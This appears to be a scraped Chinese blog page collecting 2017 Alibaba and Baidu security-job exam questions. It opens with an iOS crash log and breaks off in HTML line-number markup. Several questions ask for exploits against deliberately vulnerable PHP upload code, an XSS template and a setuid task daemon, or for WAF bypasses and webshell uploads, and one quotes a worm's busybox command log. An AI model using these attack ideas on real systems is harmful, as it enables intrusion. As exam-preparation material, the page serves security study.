Dispatch queue: com.apple.main-thread<br>Thread 0 Crashed:<br>0       ???                             0x10a463500 0x00000000 + 0x10a463500<br>1       JavaScriptCore                  0x187eeea88 0x187b14000 + 0x3daa88  // long long JSC::APICallbackFunction::call<a href="JSC::JSCallbackFunction">JSC::JSCallbackFunction</a>(JSC::ExecState*) + 0x1a4<br>2       JavaScriptCore                  0x187b5a3b4 0x187b14000 + 0x463b4   // JSC::LLInt::setUpCall(JSC::ExecState*, JSC::Instruction*, JSC::CodeSpecializationKind, JSC::JSValue, JSC::LLIntCallLinkInfo*) + 0x1dc<br>3       JavaScriptCore                  0x187f9dd68 0x187b14000 + 0x489d68  // llint_entry + 0x5c58<br>4       JavaScriptCore                  0x187f97ef8 0x187b14000 + 0x483ef8  // vmEntryToJavaScript + 0x138<br>5       JavaScriptCore                  0x187ec4c48 0x187b14000 + 0x3b0c48  // JSC::JITCode::execute(JSC::VM*, JSC::ProtoCallFrame*) + 0xb4<br>6       JavaScriptCore                  0x187b45660 0x187b14000 + 0x31660   // JSC::Interpreter::execute(JSC::ProgramExecutable*, JSC::ExecState*, JSC::JSObject*) + 0x200c<br>7       JavaScriptCore                  0x187c9dab0 0x187b14000 + 0x189ab0  // JSC::evaluate(JSC::ExecState*, JSC::SourceCode const&amp;, JSC::JSValue, WTF::NakedPtr<a href="JSC::Exception">JSC::Exception</a>&amp;) + 0x1b8<br>8       JavaScriptCore                  0x187ee8964 0x187b14000 + 0x3d4964  // JSEvaluateScript + 0x1a0<br>9     + libcycript.dylib                0x10aaab6c0 0x10aa64000 + 0x476c0   // CYExecute(OpaqueJSContext const*, CYPool&amp;, CYUTF8String) + 0x9c<br>10    + libcycript.dylib                0x10aad0af0 0x10aa64000 + 0x6caf0   // CYPerform(void*) + 0x44<br>11      CoreFoundation                  0x1864a0544 0x1863c4000 + 0xdc544   // <strong>CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION</strong> + 0x18<br>12      CoreFoundation                  0x18649ffd8 0x1863c4000 + 0xdbfd8   // __CFRunLoopDoSources0 + 0x21c<br>13      CoreFoundation                  0x18649dcd8 0x1863c4000 + 0xd9cd8   // __CFRunLoopRun + 0x2d4<br>14      CoreFoundation                  0x1863ccca0 0x1863c4000 + 0x8ca0    // CFRunLoopRunSpecific + 0x180<br>15      GraphicsServices                0x191434088 0x191428000 + 0xc088    // GSEventRunModal + 0xb4</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_8</span><br></pre></td></tr></table></figure><p>在android的加壳的方案里，很多壳都会引入反调试机制。列举你所知道的反调试技术，三种以上，并给出原理。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_9</span><br></pre></td></tr></table></figure><p>作为一个安全研究者, 你能想到哪些办法对家里的IoT设备进行加固, 避免其遭受黑客攻击？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_10</span><br></pre></td></tr></table></figure><p>以下为某蠕虫执行命令日志，请问这个蠕虫想通过这些命令达到什么效果。</p><p>/bin/busybox echo -e ‘\x6b\x61\x6d\x69/run’ &gt; /run/.nippon; /bin/busybox cat /run/.nippon; /bin/busybox rm /run/.nippon<br>/bin/busybox echo -e ‘\x6b\x61\x6d\x69/tmp’ &gt; /tmp/.nippon; /bin/busybox cat /tmp/.nippon; /bin/busybox rm /tmp/.nippon<br>/bin/busybox echo -e ‘\x6b\x61\x6d\x69/sys’ &gt; /sys/.nippon; /bin/busybox cat /sys/.nippon; /bin/busybox rm /sys/.nippon<br>/bin/busybox echo -e ‘\x6b\x61\x6d\x69/run’ &gt; /run/.nippon; /bin/busybox cat /run/.nippon; /bin/busybox rm /run/.nippon<br>/bin/busybox echo -e ‘\x6b\x61\x6d\x69/dev’ &gt; /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon<br>/bin/busybox echo -e ‘\x6b\x61\x6d\x69/sys’ &gt; /sys/.nippon; /bin/busybox cat /sys/.nippon; /bin/busybox rm /sys/.nippon</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_11</span><br></pre></td></tr></table></figure><p>如何给linux web服务器做加固，请简述步骤。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_12</span><br></pre></td></tr></table></figure><p>通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_13</span><br></pre></td></tr></table></figure><p>linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_14</span><br></pre></td></tr></table></figure><p>你通过某爬虫获得了 *.aliyun.com 下100万条URL（包括动态页面、静态资源等URL），接下来你打算对这些URL进行黑盒扫描。<br>为了提高扫描效率，你需要对这些URL进行去重。请简述你的URL去重方案及理由。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_15</span><br></pre></td></tr></table></figure><p>请简要描述最近的struts2 S2-045漏洞的原理，及构造POC需要满足怎样的条件？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_16</span><br></pre></td></tr></table></figure><p>请分析如下代码有何漏洞，并给出exploit。</p>  <?php  if (isset($_POST['upload'])) {      $upload_dir = "uploads/";      $file_name = $_FILES['file']['name'];      $file_extension = substr($file_name, strrpos($file_name, '.') + 1);      $file_type = $_FILES['file']['type'];      $file_size = $_FILES['file']['size'];      if (($file_type == "image/jpeg" || $file_type == "image/png") && $file_size <  100000) {          $save_file_name = time();          $save_path = $upload_dir . $save_file_name . "." . $file_extension;          if (!move_uploaded_file($_FILES['file']['tmp_name'], $save_path)) {              echo "your image is not uploaded";      } else {          echo "wrong file type.Only accept images";      }  }  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_17</span><br></pre></td></tr></table></figure><p>小明对一站点进行渗透测试，发现一处参数明显存在shell命令注入问题。<br>但是&quot;| ls&quot;，&quot;’ &amp;&amp; ls #&quot;等方式均无法执行成功命令。<br>请分析具体的情况，并给出各种情况下的测试步骤。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_18</span><br></pre></td></tr></table></figure><p>请说出网络防火墙的不同类别，它们分别在安全上有什么优势和缺点，<br>以及在大型互联网公司，更适合采用何种网络防火墙，为什么？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_19</span><br></pre></td></tr></table></figure><p>本题故意留空.<br>来自 <a href="https://github.com/SecYouth/all-about-security-jobs">https://github.com/SecYouth/all-about-security-jobs</a><br>QQ群 306335642</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_20</span><br></pre></td></tr></table></figure><p>请阅读下面一段汇编代码，判断其是否存在安全漏洞？如果存在，请指出漏洞成因</p><p>make_table      proc near<br>src             = qword ptr -20h<br>var_18          = dword ptr -18h<br>n               = qword ptr -14h<br>size            = qword ptr -8</p><pre><code>              push    rbp              mov     rbp, rsp              sub     rsp, 20h              mov     dword ptr [rbp+n], edi              mov     [rbp+var_18], esi              mov     [rbp+src], rdx              mov     eax, dword ptr [rbp+n]              imul    eax, [rbp+var_18]              mov     dword ptr [rbp+size], eax              mov     eax, dword ptr [rbp+size]              mov     rdi, rax        ; size              call    _malloc              mov     [rbp+n+4], rax              cmp     [rbp+n+4], 0              jnz     short loc_4005D6              mov     eax, 0              jmp     short locret_400611</code></pre><p>loc_4005D6:<br>mov     dword ptr [rbp+size+4], 0<br>jmp     short loc_400605<br>loc_4005DF:<br>mov     edx, dword ptr [rbp+n] ; n<br>mov     eax, dword ptr [rbp+size+4]<br>imul    eax, dword ptr [rbp+n]<br>mov     ecx, eax<br>mov     rax, [rbp+n+4]<br>add     rcx, rax<br>mov     rax, [rbp+src]<br>mov     rsi, rax<br>mov     rdi, rcx<br>call    _memcpy<br>add     dword ptr [rbp+size+4], 1</p><p>loc_400605:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_21</span><br></pre></td></tr></table></figure><p>现有办公网、生产网各一份DNS服务器采集的DNS日志，<br>包括时间、请求域名domain、请求类型type、返回值value、源IP、源端口信息。<br>根据这两份数据，分别阐述你可以产出什么类型的安全告警，并作简要思路说明。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_22</span><br></pre></td></tr></table></figure><p>Objective-C语言里的isa是什么？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_23</span><br></pre></td></tr></table></figure><p>有什么利弊？小明周末去星巴克喝咖啡，回到家后，发现他的微博帐号被人盗用了。请问可能发生什么事情了，原理是什么，如何防范</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_24</span><br></pre></td></tr></table></figure><p>分别介绍下method-swizzling和isa-swizzling，以及它们通常用在什么场景下？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_25</span><br></pre></td></tr></table></figure><p>淘宝日常流量中有一部分不法人员通过机器批量秒杀商品，<br>或者通过web安全技术对阿里的系统进行攻击盗取账号等，对消费者和商家造成一定危害，<br>如果现在要你通过一套算法体系准确区分出正常流量和恶意流量？<br>如果有对正常流量的错分类，该如何做？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_26</span><br></pre></td></tr></table></figure><p>请说出至少3个IOT设备使用的网络通信协议，并简述其特点。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_27</span><br></pre></td></tr></table></figure><p>描述cloudbleed漏洞的主要成因。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_28</span><br></pre></td></tr></table></figure><p>如下是某司批量执行普通员工提交任务的守护进程，普通员工通过创建文件/opt/task/tasklist.sh提交任务，其核心逻辑如下:<br>struct stat info;<br>stat(&quot;/opt/task/tasklist.sh&quot;, &amp;info);<br>setgid(info.st_gid);<br>setuid(info.st_uid);<br>system(&quot;/opt/task/tasklist.sh&quot;);<br>该进程运行时状态如下:<br>UID        PID  PPID  C STIME TTY          TIME CMD<br>root      4337  3977  0 15:29 pts/2    00:00:00  supervisor<br>该程序存在严重漏洞，请给出exploit。<br>请分析该代码违反哪些安全编码原则?如何设计自动化审计程序发现所有代码中存在的问题?</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_29</span><br></pre></td></tr></table></figure><p>如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_30</span><br></pre></td></tr></table></figure><p>某非著名购物网站最近发现总是收到用户投诉订单信息被泄漏，<br>网站安全专家严格排查了服务器和数据库的日志，没有发现入侵迹象，<br>但发现在web访问日志有一个用户访问订单页面的次数非常多而且url中的订单号是连续的，<br>网站安全专家马上明白了问题所在，<br>请问安全专家明白了什么？这个问题如何解决？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_31</span><br></pre></td></tr></table></figure><p>一个blog系统中如果需要使用富文本编辑器，<br>用来展示图片、不同的字体和格式需要使用html中的富文本标签例如<img>等，<br>在这种场景下，可能会存在哪些方面的安全风险，应该如何进行防御？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_32</span><br></pre></td></tr></table></figure><p>对于如下模版：</p>  <script>      var s='${a}'+'${b}';  </script><p>其中a,b为用户输入的参数，过滤了单引号和尖括号，是否存在xss漏洞，若存在给出利用代码</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_33</span><br></pre></td></tr></table></figure><p>简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_34</span><br></pre></td></tr></table></figure><p>请列出黑客绕过WAF的安全防护的方法，并简述如何实现？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_35</span><br></pre></td></tr></table></figure><p>比特币挖矿软件的常用协议有哪些,<br>如何在网络层去检测挖矿行为, 给出检测方案.<br>&lt;!&gt; 具体题干未知.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_36</span><br></pre></td></tr></table></figure><p>给了一段android权限的xml, 要求描述可能操作<br>&lt;!&gt; 具体题干未知.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_37</span><br></pre></td></tr></table></figure><p>botnet有哪些威胁 如何检测 如何解决<br>&lt;!&gt; 具体题干未知.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_38</span><br></pre></td></tr></table></figure><p>服务器代理技术分为哪几类? 在安全上分别有怎样的应用? 分别面临怎样的安全风险?</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_39</span><br></pre></td></tr></table></figure><p>通过Fuzz对某个开源工具进行漏洞挖掘，<br>如果使用该工具进行Fuzz并长时间未能得到任何结果，<br>应该如何诊断问题并改进Fuzz方法</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_40</span><br></pre></td></tr></table></figure><p>请写出一个尽可能完整的http请求包，并分析哪些字段可用作攻击，写出具体的场景和对应的安全风险。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_41</span><br></pre></td></tr></table></figure><p>日常生活中用算法解决了什么问题<br>&lt;!&gt; 具体题干未知.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_42</span><br></pre></td></tr></table></figure><p>为了通过日志排查营销活动中批量小号抽奖的行为，<br>请设计需要获取的事件格式，并且制定识别策略。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_43</span><br></pre></td></tr></table></figure><p>逆向工具打开一个APK的dex, 发现所有类名都是a b v a$a 之类的。<br>这种命名是如何实现的, 针对这种命名, 如何进行高效的逆向分析?<br>&lt;!&gt; 具体题干未知.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_44</span><br></pre></td></tr></table></figure><p>当前IOT设备存在哪些安全问题, 硬件+软件 如何防御<br>&lt;!&gt; 具体题干未知.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_45</span><br></pre></td></tr></table></figure><p>黑客入侵以后, 加密所有数据对使用者进行勒索, 从os和sql考虑如何防御.<br>&lt;!&gt; 具体题干未知.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_46</span><br></pre></td></tr></table></figure><p>基于docker容器技术为客户提供服务, 看服务器运行docker容器时的进程信息, 分析服务器平台自身是否存在风险<br>&lt;!&gt; 具体题干未知.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_47</span><br></pre></td></tr></table></figure><p>某LNMP架构的大型网站存在文件包含漏洞, 没有上传点,<br>如何利用该弱点上传webshell, 如何防御<br>&lt;!&gt; 具体题干未知.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_48</span><br></pre></td></tr></table></figure><p>如何实现一个被动web扫描器, 要有亮点功能<br>&lt;!&gt; 具体题干未知.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_ali_spring_49</span><br></pre></td></tr></table></figure><p>IoT攻防和普通计算机网络攻防的区别<br>&lt;!&gt; 具体题干未知.</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">非常欢迎补充或者给出自己的参考答案!</span><br><span class="line"></span><br><span class="line"># 2017 百度 春招 安全 笔试题</span><br><span class="line"></span><br><span class="line">| 公司 | 百度                          |</span><br><span class="line">|:-----|:-----------------------------|</span><br><span class="line">| 时间 | 2017.04.27晚                  |</span><br><span class="line">| 形式 | 网页, 在线, 有摄像头, 赛码网    |</span><br><span class="line">| 题型 | 简答\*10 算法\*2 系统设计题\*1 |</span><br><span class="line">| 时长 | 2小时                         |</span><br><span class="line"></span><br><span class="line">整理自群(306335642)  </span><br><span class="line">题的编号是非官方的, 仅供讨论方便</span><br><span class="line"></span><br><span class="line">&gt; **警告! 此处有坑**  </span><br><span class="line">&gt; 尽管邮件中说是可以用本地IDE, 但是实际上不可以跳出!</span><br><span class="line"></span><br><span class="line">## 题目</span><br><span class="line"></span><br><span class="line">* 2017_baidu_spring_1</span><br></pre></td></tr></table></figure><p>请回答如下端口默认对应的服务，以及在渗透测试过程中我们可以从哪些角度考虑其安全问题。<br>端口：21、22、873、1433、3306、6379、11211</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_baidu_spring_2</span><br></pre></td></tr></table></figure><p>你所知道的网络抓包工具有哪些？对android或者ios设备怎么进行抓包。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_baidu_spring_3</span><br></pre></td></tr></table></figure><p>请说明黑客常用的清除痕迹的方式及对应的监控方法（linux和windows系统）</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_baidu_spring_4</span><br></pre></td></tr></table></figure><p>罗列最近几年影响较大的安全漏洞并请大概介绍其原理、危害（请列举3个）</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_baidu_spring_5</span><br></pre></td></tr></table></figure><p>介绍你所知道的加密算法，都属于什么类型的加密算法？怎么保证加密的安全性？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_baidu_spring_6</span><br></pre></td></tr></table></figure><p>PHP中了解有哪些容易导致漏洞的危险函数？并且简述会造成什么类型的风险</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_baidu_spring_7</span><br></pre></td></tr></table></figure><p>文件包含漏洞的常见WAF绕过方式（以读取/etc/passwd为例）</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_baidu_spring_8</span><br></pre></td></tr></table></figure><p>现有一个需要注册才能使用的Android APP，打开APP时，<br>显示：请输入正确的序列号。如序列号不正确，提示：你输入的序列号错误。<br>问：如何对该APP进行分析破解，用最简单的，使之输入任意序列号即可使用。<br>请描述分析方法、使用工具</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_baidu_spring_8</span><br></pre></td></tr></table></figure><p>请描述PE文件加壳、脱壳步骤？</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_baidu_spring_9</span><br></pre></td></tr></table></figure><p>TCP三次握手的原理，并简单描述下端口扫描的几种实现方式及优缺点</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_baidu_spring_10</span><br></pre></td></tr></table></figure><p>有N个大小不等的自然数（1–N），乱序存于数组从1到n下标的空间中，<br>请将它们由小到大排序，不能直接赋值或输出。<br>要求程序算法：时间复杂度为O(n)，空间复杂度为O(1)。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_baidu_spring_11</span><br></pre></td></tr></table></figure><p>对任意输入的正整数N，编写C程序求N!的尾部连续0的个数，并指出计算复杂度。<br>如：17！＝355687428096000，尾部连续0的个数是3。<br>（不用考虑数值超出计算机整数界限的问题</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 2017_baidu_spring_12</span><br></pre></td></tr></table></figure><p>从其他渠道获知A站被黑，同时黑客上传了webshell（是否被黑客删除未知），<br>该服务器上没有任何安全防御措施，只有web访问日志。<br>假如你是安全工程师小王，请你说明如何排查快速定位问题点，<br>同时设计有效的安全防御系统，防范类似情况发生，<br>防御系统至少包括sql注入、上传webshell等高危漏洞的防御措施。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span 